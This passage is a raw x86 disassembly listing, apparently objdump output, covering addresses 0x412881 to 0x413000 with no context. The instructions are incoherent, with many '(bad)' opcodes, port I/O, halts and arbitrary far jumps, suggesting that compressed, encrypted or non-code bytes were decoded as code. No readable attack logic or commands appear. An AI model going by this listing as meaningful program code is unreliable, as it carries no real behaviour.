  412881:	lods   eax,DWORD PTR ds:[esi]
  412882:	mov    dl,0x85
  412884:	or     BYTE PTR [edi-0x80],0x66
  412888:	adc    eax,0x2d4d0213
  41288d:	inc    ebp
  41288e:	xchg   bl,bh
  412890:	adc    bl,BYTE PTR [ecx+0xa049e80]
  412896:	mov    ds:0xa2aa7c1c,al
  41289b:	cdq    
  41289c:	(bad)  
  41289d:	rol    DWORD PTR ds:0xb1f5243c,cl
  4128a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128a4:	test   eax,0x1b4f2163
  4128a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128aa:	inc    edi
  4128ab:	mov    ah,dl
  4128ad:	mov    cl,0xd
  4128af:	jae    0x412864
  4128b1:	(bad)  
  4128b2:	loopne 0x4128e2
  4128b4:	sahf   
  4128b5:	push   esi
  4128b6:	add    BYTE PTR [ebp+0x3d7873a8],bl
  4128bc:	es mov ecx,0x34710b34
  4128c2:	mov    ecx,0x81408454
  4128c7:	addr16 add al,0xdb
  4128ca:	mov    cl,0x5a
  4128cc:	call   0x6657:0x2480d5f3
  4128d3:	sbb    DWORD PTR [edx-0x23],esp
  4128d6:	pusha  
  4128d7:	scas   al,BYTE PTR es:[edi]
  4128d8:	cmp    bh,cl
  4128da:	out    dx,eax
  4128db:	push   ecx
  4128dc:	(bad)  
  4128dd:	xlat   BYTE PTR ds:[ebx]
  4128de:	imul   ecx,DWORD PTR [edi],0x2f
  4128e1:	ret    0x5eef
  4128e4:	push   ss
  4128e5:	loopne 0x4128ba
  4128e7:	adc    eax,0xfa3ae7c1
  4128ec:	inc    edx
  4128ed:	test   bh,bl
  4128ef:	jnp    0x412924
  4128f1:	lea    esp,[edx-0x614f0a99]
  4128f7:	test   BYTE PTR [esi-0x160b555e],ch
  4128fd:	pop    ebx
  4128fe:	pop    es
  4128ff:	repz jne 0x4128d2
  412902:	add    al,bh
  412904:	daa    
  412905:	add    dh,al
  412907:	push   0x5040a6b4
  41290c:	jge    0x4128b4
  41290e:	push   eax
  41290f:	test   al,0x79
  412911:	cmp    dl,BYTE PTR [esi]
  412913:	pusha  
  412914:	std    
  412915:	jmp    DWORD PTR [eax]
  412917:	outs   dx,DWORD PTR ds:[esi]
  412918:	dec    esp
  412919:	sbb    eax,0x3c868564
  41291e:	push   esi
  41291f:	jb     0x41298d
  412921:	sub    al,0x7f
  412923:	into   
  412924:	adc    dh,BYTE PTR [ecx]
  412926:	pop    eax
  412927:	dec    ecx
  412928:	cmc    
  412929:	in     al,0x28
  41292b:	or     al,0x4e
  41292d:	or     eax,0xea7ffe92
  412932:	xchg   ecx,eax
  412933:	xchg   ecx,eax
  412934:	sbb    al,bh
  412936:	mov    cl,BYTE PTR [edx+0x16370986]
  41293c:	gs addr16 jns 0x41294c
  412940:	adc    al,0x2a
  412942:	mov    edi,0xc98980cb
  412947:	sub    al,BYTE PTR [edx]
  412949:	js     0x412976
  41294b:	push   cs
  41294c:	xchg   cx,ax
  41294e:	jnp    0x4129ba
  412950:	(bad)  
  412951:	jae    0x412968
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	shl    BYTE PTR [edi],1
  412956:	iret   
  412957:	adc    eax,0xb060f911
  41295c:	sub    DWORD PTR [edi+0x7e8f95b4],0x1b8953cf
  412966:	add    DWORD PTR ds:0xa2d6b3a2,ebx
  41296c:	out    dx,eax
  41296d:	mov    ds:0xeaf408a4,al
  412972:	mov    ebp,0x65021e02
  412977:	dec    edx
  412978:	pop    es
  412979:	push   0xffffffc4
  41297b:	dec    esp
  41297c:	or     al,0x2
  41297e:	pop    edi
  41297f:	inc    ebx
  412980:	sub    BYTE PTR es:[ebp-0x6fcadd6],0x2d
  412988:	stos   DWORD PTR es:[edi],eax
  412989:	jl     0x4129a9
  41298b:	jl     0x4129fd
  41298d:	bnd jno 0x41299a
  412990:	inc    ebx
  412991:	jns    0x4129b4
  412993:	mov    ah,0xa7
  412995:	add    BYTE PTR [ecx-0x49],dh
  412998:	mov    al,0xd1
  41299a:	nop
  41299b:	dec    cx
  41299d:	(bad)  
  41299e:	das    
  41299f:	adc    eax,0xdfae1cbc
  4129a4:	sub    edx,ecx
  4129a6:	xchg   BYTE PTR [ebx-0x3d3b6b27],dl
  4129ac:	mov    dh,0xf
  4129ae:	pop    esi
  4129af:	dec    edi
  4129b0:	in     eax,0x71
  4129b2:	call   0x8917eee
  4129b7:	fsubr  st,st(0)
  4129b9:	stos   BYTE PTR es:[edi],al
  4129ba:	rcl    BYTE PTR [eax+0x11e81af],cl
  4129c0:	cld    
  4129c1:	or     ebx,DWORD PTR [eax]
  4129c3:	lds    edi,FWORD PTR [esi]
  4129c5:	xor    BYTE PTR [edi],ah
  4129c7:	pop    ebp
  4129c8:	lods   eax,DWORD PTR ds:[esi]
  4129c9:	ret    
  4129ca:	mov    ecx,0x749c6329
  4129cf:	add    BYTE PTR ds:0x9504ed57,bl
  4129d5:	mov    al,0xc9
  4129d7:	fnstsw WORD PTR [ecx]
  4129d9:	jae    0x412979
  4129db:	adc    BYTE PTR [eax-0x1feace1c],cl
  4129e1:	add    BYTE PTR [edi-0x44],bh
  4129e4:	aad    0x1c
  4129e6:	sbb    dl,BYTE PTR [eax-0x16fd9f84]
  4129ec:	lds    ebp,FWORD PTR ds:0xd06e2f0f
  4129f2:	pop    ebx
  4129f3:	cmp    dh,bl
  4129f5:	test   DWORD PTR [ebx+0x1f],ebx
  4129f8:	mov    ecx,0xe32cc038
  4129fd:	into   
  4129fe:	push   cs
  4129ff:	and    al,0x3d
  412a01:	int    0x6d
  412a03:	and    bl,BYTE PTR [ebp+eiz*8-0x4c0af6bc]
  412a0a:	sti    
  412a0b:	mov    ecx,DWORD PTR [edx+0x3ab85e64]
  412a11:	push   ds
  412a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a13:	(bad)  
  412a14:	jns    0x412a8c
  412a16:	jl     0x4129ba
  412a18:	fisubr WORD PTR [edi+0x78]
  412a1b:	stos   DWORD PTR es:[edi],eax
  412a1c:	xchg   esp,eax
  412a1d:	jno    0x412a1e
  412a1f:	hlt    
  412a20:	jg     0x4129f6
  412a22:	pop    esp
  412a23:	xor    BYTE PTR [edx-0x461a7555],ch
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	inc    ecx
  412a2b:	div    DWORD PTR [edi]
  412a2d:	adc    al,0x25
  412a2f:	scas   al,BYTE PTR es:[edi]
  412a30:	xlat   BYTE PTR ds:[ebx]
  412a31:	repnz add al,ah
  412a34:	test   edx,edi
  412a36:	adc    BYTE PTR [ebx-0x6e],0x73
  412a3a:	push   edi
  412a3b:	in     al,0x4e
  412a3d:	xor    BYTE PTR [ebp+0x2],dh
  412a40:	shl    bh,1
  412a42:	mov    eax,ds:0xa2254846
  412a47:	pop    eax
  412a48:	mov    bl,0xc7
  412a4a:	aam    0x45
  412a4c:	outs   dx,DWORD PTR ds:[esi]
  412a4d:	add    al,BYTE PTR [esi+ebp*1]
  412a50:	xchg   edi,eax
  412a51:	cmp    eax,0xb1d926d0
  412a56:	in     al,0x52
  412a58:	loop   0x412a91
  412a5a:	cwde   
  412a5b:	jns    0x412a2a
  412a5d:	daa    
  412a5e:	sahf   
  412a5f:	and    edi,DWORD PTR [edi]
  412a61:	mul    eax
  412a63:	fnstcw WORD PTR [ebx+0x58611803]
  412a69:	push   esi
  412a6a:	stos   DWORD PTR es:[edi],eax
  412a6b:	scas   al,BYTE PTR es:[edi]
  412a6c:	scas   al,BYTE PTR es:[edi]
  412a6d:	(bad)  
  412a6e:	loop   0x412a17
  412a70:	jne    0x412a59
  412a72:	fsub   DWORD PTR [esi-0x32e1592d]
  412a78:	shl    BYTE PTR [edi+0x4d5edb29],0xa1
  412a7f:	sbb    al,0xba
  412a81:	or     bl,cl
  412a83:	adc    eax,0xef8231fe
  412a88:	stos   BYTE PTR es:[edi],al
  412a89:	jl     0x412aeb
  412a8b:	and    DWORD PTR [ebp+0x4],0xfffffffa
  412a8f:	push   esi
  412a90:	pop    ebx
  412a91:	ficom  WORD PTR [ebp+0x49]
  412a94:	push   edi
  412a95:	sbb    BYTE PTR [edx],ah
  412a97:	fwait
  412a98:	mov    WORD PTR ds:0x101fc03f,es
  412a9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aa0:	push   0x5691527b
  412aa5:	(bad)  
  412aa6:	xor    al,0x4b
  412aa8:	pop    ebp
  412aa9:	jnp    0x412a8c
  412aab:	sub    eax,0xb7248c71
  412ab0:	(bad)  
  412ab1:	push   edx
  412ab2:	or     ah,BYTE PTR [ecx+0x345eb0f9]
  412ab8:	adc    esp,0x273b4333
  412abe:	mov    dh,BYTE PTR [edx+0x19eeb91c]
  412ac4:	push   ecx
  412ac5:	and    edi,ebp
  412ac7:	sar    BYTE PTR [eax+0x73fb9d6],1
  412acd:	test   al,0x92
  412acf:	and    eax,DWORD PTR [ebx+0x73]
  412ad2:	nop
  412ad3:	inc    esp
  412ad4:	and    DWORD PTR [ebp+0x66],esp
  412ad7:	rol    DWORD PTR ds:0xad9f4f9f,0xe5
  412ade:	jae    0x412aff
  412ae0:	dec    eax
  412ae2:	arpl   WORD PTR [eax],ax
  412ae4:	mov    esi,0xf65fa69e
  412ae9:	mov    esp,0x147c44f1
  412aee:	inc    edi
  412aef:	pop    ebx
  412af0:	xor    ebp,esp
  412af2:	mov    al,ds:0x7ef89a5f
  412af7:	daa    
  412af8:	xchg   ecx,eax
  412af9:	xor    eax,DWORD PTR [eax+0x45]
  412afc:	fs inc esp
  412afe:	(bad)
  412b01:	mov    eax,0x1f179c48
  412b06:	xor    BYTE PTR [ebp*4-0x421c8b82],bh
  412b0d:	xor    eax,0x3c33e93
  412b12:	fbld   TBYTE PTR [ebx]
  412b14:	sbb    DWORD PTR [edx],ebx
  412b16:	aam    0x70
  412b18:	jecxz  0x412b80
  412b1a:	jae    0x412b3f
  412b1c:	adc    al,0x15
  412b1e:	test   al,0xe2
  412b20:	in     eax,dx
  412b21:	(bad)  
  412b22:	ins    BYTE PTR es:[edi],dx
  412b23:	lds    esi,FWORD PTR [eax]
  412b25:	cmp    cl,ah
  412b27:	dec    esi
  412b28:	sub    DWORD PTR [ecx+0x46],eax
  412b2b:	jg     0x412b7c
  412b2d:	out    dx,al
  412b2e:	rcl    BYTE PTR [ecx-0x58],cl
  412b31:	mov    ebp,DWORD PTR [edi]
  412b33:	sbb    eax,0x2b74c77a
  412b38:	popf   
  412b39:	stc    
  412b3a:	and    dh,BYTE PTR [eax-0x168c5894]
  412b40:	fnstenv [esi]
  412b42:	dec    edi
  412b43:	fwait
  412b44:	arpl   WORD PTR [ecx-0x5cfae4a9],di
  412b4a:	sahf   
  412b4b:	pop    edi
  412b4c:	iret   
  412b4d:	dec    eax
  412b4e:	push   edi
  412b4f:	and    BYTE PTR [eax+0xc940539],cl
  412b55:	dec    eax
  412b56:	call   0x2038:0xe528769f
  412b5d:	adc    DWORD PTR [ecx],0xffffff80
  412b60:	popf   
  412b61:	lahf   
  412b62:	inc    edx
  412b63:	push   ebp
  412b64:	push   ebp
  412b65:	mov    al,gs:0xbfdb0400
  412b6b:	hlt    
  412b6c:	data16 mov cl,0xe5
  412b6f:	pop    ebp
  412b70:	popf   
  412b71:	shl    ebx,cl
  412b73:	lods   al,BYTE PTR ds:[esi]
  412b74:	add    DWORD PTR [edx+0x4b],eax
  412b77:	out    dx,eax
  412b78:	ret    
  412b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b7a:	mov    edi,0x79a40a03
  412b7f:	add    esp,DWORD PTR [edi-0x2019ebd8]
  412b85:	ja     0x412b7c
  412b87:	data16 xor dl,bh
  412b8a:	jb     0x412b9f
  412b8c:	scas   eax,DWORD PTR es:[edi]
  412b8d:	test   eax,0xaa40d0c
  412b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b93:	bound  edx,QWORD PTR [eax-0x70525d66]
  412b99:	ret    
  412b9a:	mul    BYTE PTR [ecx+0x29]
  412b9d:	neg    BYTE PTR [ebx]
  412b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ba0:	sbb    eax,0xef3da2e9
  412ba5:	cld    
  412ba6:	jg     0x412bc4
  412ba8:	lea    eax,[ebx-0x55a992a1]
  412bae:	aam    0x66
  412bb0:	mov    ecx,0x5f85f68
  412bb5:	scas   eax,DWORD PTR es:[edi]
  412bb6:	jo     0x412c1d
  412bb8:	das    
  412bb9:	or     esi,DWORD PTR [ecx+0x21654791]
  412bbf:	fdiv   QWORD PTR [esi+0x1b737c54]
  412bc5:	push   ebx
  412bc6:	inc    eax
  412bc7:	test   al,0xcb
  412bc9:	das    
  412bca:	mov    ch,0xce
  412bcc:	inc    ebp
  412bcd:	push   ds
  412bce:	imul   ebx,DWORD PTR [ebx],0x74
  412bd1:	mov    ah,0x16
  412bd3:	mov    ecx,0x1a867196
  412bd8:	fadd   QWORD PTR [ebp-0x5f]
  412bdb:	pop    ds
  412bdc:	clc    
  412bdd:	pop    ebp
  412bde:	(bad)  
  412bdf:	xlat   BYTE PTR ds:[ebx]
  412be0:	sbb    DWORD PTR [esp+edi*8],esp
  412be3:	sbb    eax,0xc1e7c027
  412be8:	mov    ds:0x793d49e1,al
  412bed:	dec    eax
  412bee:	sub    ah,BYTE PTR [edi]
  412bf0:	sub    BYTE PTR [ebx+0x69bb9b5c],0x75
  412bf7:	adc    eax,0xd1c3b718
  412bfc:	xchg   ecx,eax
  412bfd:	pop    edx
  412bfe:	in     al,dx
  412bff:	xlat   BYTE PTR ds:[ebx]
  412c00:	je     0x412c14
  412c02:	in     eax,dx
  412c03:	or     al,0xbf
  412c05:	push   ebx
  412c06:	mov    dl,0x86
  412c08:	out    dx,eax
  412c09:	ret    0x7122
  412c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c0d:	cs xchg ebp,eax
  412c0f:	jne    0x412c2d
  412c11:	(bad)  
  412c12:	pop    esp
  412c13:	leave  
  412c14:	cwde   
  412c15:	xor    al,0x93
  412c17:	(bad)  
  412c18:	push   edi
  412c19:	dec    esi
  412c1a:	rcr    DWORD PTR [edi-0x3437e151],cl
  412c20:	push   ecx
  412c21:	popa   
  412c22:	add    dl,BYTE PTR ds:0xb021b83d
  412c28:	cmc    
  412c29:	lahf   
  412c2a:	(bad)  
  412c2b:	fsub   QWORD PTR [eax+0x1ed53b5a]
  412c31:	fst    st(1)
  412c33:	jmp    esi
  412c35:	repz inc ecx
  412c37:	xchg   ecx,eax
  412c38:	mov    esi,0xb6451ab9
  412c3d:	push   DWORD PTR [esi-0x2beecd52]
  412c43:	and    ecx,DWORD PTR [ecx+0x38b4df3a]
  412c49:	jl     0x412cb3
  412c4b:	dec    esp
  412c4c:	fcomp  DWORD PTR [ecx]
  412c4e:	pushf  
  412c4f:	ret    
  412c50:	xchg   ebx,eax
  412c51:	outs   dx,BYTE PTR ds:[esi]
  412c52:	(bad)  
  412c53:	adc    al,BYTE PTR [eax]
  412c55:	int    0x0
  412c57:	hlt    
  412c58:	mov    edi,0x55327719
  412c5d:	pop    esi
  412c5e:	and    eax,DWORD PTR [ebp-0x22]
  412c61:	out    dx,al
  412c62:	sbb    ch,BYTE PTR [edi]
  412c64:	sahf   
  412c65:	loop   0x412c6c
  412c67:	out    dx,eax
  412c68:	loope  0x412c91
  412c6a:	push   ss
  412c6b:	in     eax,dx
  412c6c:	jge    0x412cab
  412c6e:	nop
  412c6f:	pop    es
  412c70:	dec    ebx
  412c71:	int    0x48
  412c73:	push   eax
  412c74:	sbb    al,0x3
  412c76:	repz mov eax,ds:0x4c5b93a7
  412c7c:	mov    dl,0x82
  412c7e:	mov    esi,0x12b719aa
  412c83:	popf   
  412c84:	stos   BYTE PTR es:[edi],al
  412c85:	push   es
  412c86:	jbe    0x412c38
  412c88:	adc    DWORD PTR [edx+0x64],edx
  412c8b:	imul   eax,DWORD PTR [esi],0x6d
  412c8e:	push   ebx
  412c8f:	adc    edi,edi
  412c91:	sub    BYTE PTR [ebx],dl
  412c93:	sub    BYTE PTR [eax+0x42],bl
  412c96:	jp     0x412c4d
  412c98:	pop    ebx
  412c99:	xchg   DWORD PTR [edi+0x3d],edi
  412c9c:	arpl   cx,bx
  412c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c9f:	mov    WORD PTR [edx+0x1397b239],es
  412ca5:	shr    BYTE PTR ds:0xba11fe2c,1
  412cab:	std    
  412cac:	push   esi
  412cad:	(bad)  
  412cae:	ins    DWORD PTR es:[edi],dx
  412caf:	pop    ecx
  412cb0:	outs   dx,DWORD PTR ds:[esi]
  412cb1:	xchg   ebp,eax
  412cb2:	leave  
  412cb3:	lds    ecx,FWORD PTR [edi]
  412cb5:	hlt    
  412cb6:	scas   eax,DWORD PTR es:[edi]
  412cb7:	aas    
  412cb8:	add    al,0xb6
  412cba:	adc    BYTE PTR [ecx-0x1a],bh
  412cbd:	mov    al,ds:0xa70e78ac
  412cc2:	xor    al,0xe4
  412cc4:	shr    BYTE PTR [eax+0x1b423425],0x12
  412ccb:	sbb    dl,dl
  412ccd:	clc    
  412cce:	mov    fs,WORD PTR fs:[edx-0x80]
  412cd2:	adc    ah,BYTE PTR [eax+0x6b1c151a]
  412cd8:	xor    dl,bl
  412cda:	xchg   DWORD PTR [ebx+0x1b],esp
  412cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cde:	call   FWORD PTR [esi]
  412ce0:	scas   al,BYTE PTR es:[edi]
  412ce1:	push   0x89108d8d
  412ce6:	dec    ecx
  412ce7:	xchg   esi,eax
  412ce8:	fistp  WORD PTR [esi+ecx*8-0x2f10185]
  412cef:	test   al,0x32
  412cf1:	jmp    0x412ca9
  412cf3:	mov    eax,0x1047f628
  412cf8:	jmp    0x412c87
  412cfa:	(bad)  
  412cfb:	idiv   ah
  412cfd:	sub    dh,BYTE PTR [esi]
  412cff:	imul   ebp,ebp,0x28515026
  412d05:	push   esi
  412d06:	lods   al,BYTE PTR ds:[esi]
  412d07:	nop
  412d08:	mov    bh,0x98
  412d0a:	pop    edx
  412d0b:	lea    ecx,[esi-0x7e2641a7]
  412d11:	mov    DWORD PTR [edi],edx
  412d13:	jmp    0xda50:0xb41408e5
  412d1a:	xchg   ecx,eax
  412d1b:	add    eax,0xc7bdb7dc
  412d20:	retf   0x7e40
  412d23:	add    eax,0xb53f6bb
  412d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d29:	sahf   
  412d2a:	xor    ecx,DWORD PTR [eax]
  412d2c:	ins    DWORD PTR es:[edi],dx
  412d2d:	jp     0x412d35
  412d2f:	dec    edi
  412d30:	or     bh,dl
  412d32:	adc    DWORD PTR [edx+0x1b10a2f1],ebp
  412d38:	dec    esi
  412d39:	stc    
  412d3a:	sbb    eax,0xd0d96632
  412d3f:	mov    ds:0xa64dad4a,al
  412d44:	dec    ebx
  412d45:	test   eax,0x8f926538
  412d4a:	cs mov edx,ebp
  412d4d:	adc    eax,eax
  412d4f:	xchg   edi,eax
  412d50:	adc    ch,al
  412d52:	or     BYTE PTR [ebx],dh
  412d54:	cmc    
  412d55:	imul   ebp,DWORD PTR [edi+0x2d],0xd0479acd
  412d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d5d:	enter  0x684e,0x69
  412d61:	scas   eax,DWORD PTR es:[edi]
  412d62:	pushf  
  412d63:	gs scas al,BYTE PTR es:[edi]
  412d65:	lock jmp eax
  412d68:	in     al,0xda
  412d6a:	or     ch,BYTE PTR [edi+0x4adabc3e]
  412d70:	stos   BYTE PTR es:[edi],al
  412d71:	out    dx,al
  412d72:	dec    ebp
  412d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d74:	mov    edi,ss
  412d76:	dec    edi
  412d77:	mov    ds:0xbde25154,al
  412d7c:	mov    ds:0xe5b2558b,al
  412d81:	adc    al,0x2c
  412d83:	dec    esp
  412d84:	inc    edi
  412d85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d86:	ret    0x3e68
  412d89:	shr    BYTE PTR [ecx-0x65],0xca
  412d8d:	int3   
  412d8e:	scas   al,BYTE PTR es:[edi]
  412d8f:	dec    ecx
  412d90:	inc    esp
  412d91:	stos   DWORD PTR es:[edi],eax
  412d92:	inc    edx
  412d93:	dec    esi
  412d94:	mov    esi,0x402164bb
  412d99:	jg     0x412d5f
  412d9b:	popa   
  412d9c:	sub    dl,BYTE PTR [ebx+ebx*2-0x4639cc32]
  412da3:	sub    al,0x9d
  412da5:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  412da7:	nop
  412da8:	xchg   ecx,eax
  412da9:	gs mov esi,0x5a2ae484
  412daf:	out    0x44,eax
  412db1:	jg     0x412d6c
  412db3:	push   ebx
  412db4:	xor    al,0xfd
  412db6:	jnp    0x412df8
  412db8:	shr    DWORD PTR [esi-0x4153c8e],1
  412dbe:	cld    
  412dbf:	in     eax,dx
  412dc0:	add    ch,BYTE PTR [eax-0x3d7adcca]
  412dc6:	pop    eax
  412dc7:	hlt    
  412dc8:	dec    eax
  412dc9:	lahf   
  412dca:	or     DWORD PTR [ebx+0x1d],0xe8f9c9ae
  412dd1:	push   ss
  412dd2:	in     al,dx
  412dd3:	and    al,0x90
  412dd5:	xchg   edi,ebp
  412dd7:	loop   0x412dbc
  412dd9:	js     0x412e3b
  412ddb:	sub    al,0x79
  412ddd:	jae    0x412ded
  412ddf:	push   0xffffffa9
  412de1:	test   eax,0xa8c245e8
  412de6:	not    BYTE PTR [ebx-0x6b]
  412de9:	popf   
  412dea:	pop    ebp
  412deb:	rcr    BYTE PTR [esi+0x6291b400],1
  412df1:	sub    dh,dl
  412df3:	addr16 retf 0xec20
  412df7:	mov    ebp,0xe3c03917
  412dfc:	push   0xffffffe1
  412dfe:	or     ah,bh
  412e00:	mov    cl,0xb8
  412e02:	and    BYTE PTR [edi],ch
  412e04:	mov    dl,0xf5
  412e06:	sahf   
  412e07:	sub    BYTE PTR [eax+0x553f2b47],ah
  412e0d:	out    0x90,eax
  412e0f:	popa   
  412e10:	sub    eax,0x7c912d7d
  412e15:	out    dx,eax
  412e16:	pop    edi
  412e17:	jnp    0x412d9c
  412e19:	and    eax,0xc9c15642
  412e1e:	add    al,0xea
  412e20:	inc    eax
  412e22:	sub    DWORD PTR [esi],edi
  412e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e25:	outs   dx,BYTE PTR ds:[esi]
  412e26:	jmp    0x412de9
  412e28:	push   cs
  412e29:	mov    eax,0x95f9b3ab
  412e2e:	call   0xface329a
  412e33:	dec    esi
  412e34:	sub    ebp,esi
  412e36:	jge    0x412de0
  412e38:	retf   0x936c
  412e3b:	xchg   esi,eax
  412e3c:	mov    cl,0x8
  412e3e:	pop    ebp
  412e3f:	add    cl,BYTE PTR [eax-0x3b]
  412e42:	and    DWORD PTR [edx+0x297920f4],ecx
  412e48:	in     al,dx
  412e49:	std    
  412e4a:	into   
  412e4b:	mov    edi,0x50d9f8f1
  412e50:	jmp    0xb49e42d4
  412e55:	aam    0xf1
  412e57:	cdq    
  412e58:	add    ah,0xf4
  412e5b:	mov    esi,0x76392ff5
  412e60:	es jmp 0xb54a:0x2e24f99e
  412e68:	push   0xcfc07c66
  412e6d:	js     0x412df7
  412e6f:	mov    ah,0x46
  412e71:	outs   dx,DWORD PTR ds:[esi]
  412e72:	inc    esi
  412e73:	inc    ebx
  412e74:	cmc    
  412e75:	and    BYTE PTR [ebx],bh
  412e77:	jne    0x412e38
  412e79:	push   cs
  412e7a:	dec    edx
  412e7b:	aas    
  412e7c:	mov    bl,0x74
  412e7e:	idiv   edi
  412e80:	xchg   edi,eax
  412e81:	ss mov dl,0x78
  412e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e85:	retf   
  412e86:	je     0x412ecd
  412e88:	lods   al,BYTE PTR ds:[esi]
  412e89:	daa    
  412e8a:	or     bl,cl
  412e8c:	push   ds
  412e8d:	xchg   BYTE PTR ds:0x16268f29,dh
  412e93:	daa    
  412e94:	sar    bh,cl
  412e96:	cli    
  412e97:	lahf   
  412e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e99:	mov    ch,0xc6
  412e9b:	call   FWORD PTR [eax]
  412e9d:	sbb    al,BYTE PTR [eax]
  412e9f:	iret   
  412ea0:	push   cs
  412ea1:	mov    eax,0x36705e1a
  412ea6:	push   ds
  412ea7:	sub    ch,BYTE PTR [edx+0x38e07301]
  412ead:	pop    es
  412eae:	adc    eax,0xb19bae5a
  412eb3:	daa    
  412eb4:	dec    eax
  412eb5:	leave  
  412eb6:	sti    
  412eb7:	xchg   BYTE PTR [edi-0x59353bc6],bl
  412ebd:	rol    BYTE PTR [ecx+0x31ea8bda],0xe
  412ec4:	inc    eax
  412ec5:	xchg   DWORD PTR [edx-0x62122929],edx
  412ecb:	into   
  412ecc:	pop    es
  412ecd:	dec    ebx
  412ece:	adc    dh,al
  412ed0:	stos   BYTE PTR es:[edi],al
  412ed1:	and    al,0xb4
  412ed3:	(bad)  
  412ed4:	fidiv  WORD PTR [edi-0x31]
  412ed7:	out    dx,eax
  412ed8:	test   eax,0x5e5ad1fe
  412edd:	and    BYTE PTR [ebx-0x69945ec4],al
  412ee3:	ret    
  412ee4:	fcomp  DWORD PTR [esi]
  412ee6:	adc    eax,0xaf12bb4
  412eeb:	inc    esi
  412eec:	ds sbb al,0x55
  412eef:	add    cl,BYTE PTR [ecx-0x74]
  412ef2:	and    esp,DWORD PTR [eax+0x53]
  412ef5:	aaa    
  412ef6:	pop    edi
  412ef7:	cdq    
  412ef8:	pop    edi
  412ef9:	(bad)  
  412efa:	jecxz  0x412ed7
  412efc:	inc    eax
  412efd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412efe:	mov    esi,0xb539caf5
  412f03:	iret   
  412f04:	fisttp QWORD PTR [ebx+0x1f4c4e88]
  412f0a:	repz or al,0xd1
  412f0d:	scas   eax,DWORD PTR es:[edi]
  412f0e:	test   eax,0xa8d57f40
  412f13:	imul   ecx,DWORD PTR [edx+0x3b],0x767579d9
  412f1a:	psubq  mm5,QWORD PTR [esi-0x59209a04]
  412f21:	jne    0x412ec1
  412f23:	sti    
  412f24:	or     bh,BYTE PTR [edx+0x5b]
  412f27:	popf   
  412f28:	push   esp
  412f29:	or     ecx,edi
  412f2b:	lea    ebp,[edx-0x6fa4ae9]
  412f31:	xchg   ebp,eax
  412f32:	je     0x412ed0
  412f34:	mov    esi,0xf10aa687
  412f39:	push   ds
  412f3a:	mov    DWORD PTR [eax+0x56],edi
  412f3d:	dec    ebp
  412f3e:	pusha  
  412f3f:	adc    ch,BYTE PTR [eax]
  412f41:	cmc    
  412f42:	test   DWORD PTR [edi+ebp*1],eax
  412f45:	fwait
  412f46:	push   edi
  412f47:	lods   eax,DWORD PTR ds:[esi]
  412f48:	adc    ecx,DWORD PTR [eax+0x5]
  412f4b:	push   ds
  412f4c:	mov    eax,ds:0x57498538
  412f51:	push   0x3b
  412f53:	(bad)  
  412f54:	(bad)  
  412f55:	sbb    bh,BYTE PTR [eax+edx*2]
  412f58:	pop    esi
  412f59:	inc    ebp
  412f5a:	adc    eax,0x6d1390d0
  412f5f:	aam    0x8d
  412f61:	inc    esp
  412f62:	xchg   ch,ch
  412f64:	add    BYTE PTR [edi+0x7abf9500],dl
  412f6a:	mov    ebx,es
  412f6c:	js     0x412f25
  412f6e:	jbe    0x412fbf
  412f70:	iret   
  412f71:	repz mov eax,0xdb9d9a56
  412f77:	add    eax,0x64c123bf
  412f7c:	call   0xb9f89d47
  412f81:	mov    edi,0x9a59070c
  412f86:	retf   0x9ed6
  412f89:	jns    0x412ff5
  412f8b:	lds    ebx,FWORD PTR [ecx+edx*4+0x4577dbac]
  412f92:	das    
  412f93:	push   0xffffff98
  412f95:	cmp    eax,0xa4f9ffe3
  412f9a:	cmc    
  412f9b:	pushf  
  412f9c:	std    
  412f9d:	hlt    
  412f9e:	arpl   ax,si
  412fa0:	xor    BYTE PTR [edx+0x55],0x1a
  412fa4:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  412fa6:	add    DWORD PTR [edi-0x6f72099c],ecx
  412fac:	jo     0x412f74
  412fae:	cmp    DWORD PTR [ebp-0x58],0xffffffed
  412fb2:	sub    BYTE PTR ds:0xe46c88bc,ch
  412fb8:	imul   edx,DWORD PTR [eax+0x5a01371c],0xffffff9d
  412fbf:	dec    edx
  412fc0:	repnz add esi,DWORD PTR [edi-0x1226df1]
  412fc7:	add    al,0x5a
  412fca:	push   esp
  412fcb:	dec    esi
  412fcc:	add    DWORD PTR [edx+eax*8],esi
  412fcf:	mov    dl,0xc9
  412fd1:	(bad)  
  412fd2:	cmp    bh,dl
  412fd4:	retf   
  412fd5:	pop    edi
  412fd6:	cwde   
  412fd7:	cmp    DWORD PTR [ecx],edx
  412fd9:	ficomp WORD PTR [eax+0x5a]
  412fdc:	cmp    al,0xe6
  412fde:	inc    esi
  412fdf:	loope  0x413051
  412fe1:	inc    eax
  412fe2:	push   esi
  412fe3:	mov    dl,0x83
  412fe5:	or     eax,0x95261f81
  412fea:	shl    DWORD PTR [edi-0x2a808298],cl
  412ff0:	std    
  412ff1:	adc    al,0x48
  412ff3:	ret    0xc850
  412ff6:	push   es
  412ff7:	and    al,BYTE PTR [edx-0x6]
  412ffa:	adc    eax,0x86c5ea2f
  412fff:	dec    eax
  413000:	cmp    DWORD PTR [edi],ecx
